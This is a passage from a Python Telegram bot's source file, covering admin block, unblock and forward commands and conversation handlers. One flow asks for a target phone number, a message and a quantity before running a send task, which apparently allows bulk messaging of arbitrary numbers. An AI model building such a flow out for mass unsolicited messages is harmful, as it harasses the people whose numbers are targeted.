        await update.message.reply_text(f"Send the message/photo/video to forward to {target_id}:", reply_markup=get_cancel_keyboard())
        return ADMIN_WAIT_PAYLOAD
    except:
        await update.message.reply_text("Usage: /send <chat_id>")
        return ConversationHandler.END

async def admin_forward_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_id = context.user_data.get('admin_target_chat')
    try:
        await update.message.copy(chat_id=target_id)
        await update.message.reply_text(f"✅ Successfully sent to {target_id}.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send: {e}")
    return ConversationHandler.END

# Admin basic commands
async def cmd_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        t_id = int(context.args[0])
        BLOCKED_USERS.add(t_id)
        cancel_user_otp_task(t_id)
        cancel_user_send_task(t_id)
        await update.message.reply_text(f"✅ User {t_id} blocked.")
    except: await update.message.reply_text("Usage: /block <chat_id>")

async def cmd_release(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        t_id = int(context.args[0])
        BLOCKED_USERS.discard(t_id)
        await update.message.reply_text(f"✅ User {t_id} unblocked.")
    except: await update.message.reply_text("Usage: /release <chat_id>")

async def cmd_cancelsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        t_id = int(context.args[0])
        cancel_user_send_task(t_id)
        await update.message.reply_text(f"✅ Terminated {t_id}'s task.")
    except: await update.message.reply_text("Usage: /cancelsend <chat_id>")


# --- App Startup & Shutdown Hooks ---
async def post_init(application: Application):
    await get_http_session()
    asyncio.create_task(start_web_server())

async def post_shutdown(application: Application):
    global http_session
    if http_session and not http_session.closed: await http_session.close()


def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print("Error: BOT_TOKEN is missing.")
        return

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("block", cmd_block))
    app.add_handler(CommandHandler("release", cmd_release))
    app.add_handler(CommandHandler("cancelsend", cmd_cancelsend))
    app.add_handler(CommandHandler("track", cmd_track))
    app.add_handler(CommandHandler("editmark", cmd_editmark))

    # Project Creation Conversation
    proj_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(ask_project_name, pattern="^create_project$")],
        states={ASK_PROJECT_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_project)]},
        fallbacks=[CommandHandler('cancel', cancel_command), CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")]
    )
    app.add_handler(proj_conv)

    # Message Sending Conversation
    send_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_send_msg, pattern="^send_message$")],
        states={
            ASK_TARGET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_msg_text)],
            ASK_MESSAGE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_quantity)],
            ASK_QUANTITY: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_sending)],
        },
        fallbacks=[CommandHandler('cancel', cancel_command), CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")]
    )
    app.add_handler(send_conv)

    # Specific Tracking Conversation
    specific_no_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_specific_no, pattern="^get_specific_no$")],
        states={ASK_SPECIFIC_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_specific_number)]},
        fallbacks=[CommandHandler('cancel', cancel_command), CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")]
    )
    app.add_handler(specific_no_conv)

    # Admin forward conversation
    admin_send_conv = ConversationHandler(
        entry_points=[CommandHandler('send', cmd_admin_send)],
        states={ADMIN_WAIT_PAYLOAD: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_forward_payload)]},
        fallbacks=[CommandHandler('cancel', cancel_command), CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")]
    )
    app.add_handler(admin_send_conv)

    app.add_handler(CallbackQueryHandler(callback_router))

    print("Starting bot and web server...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
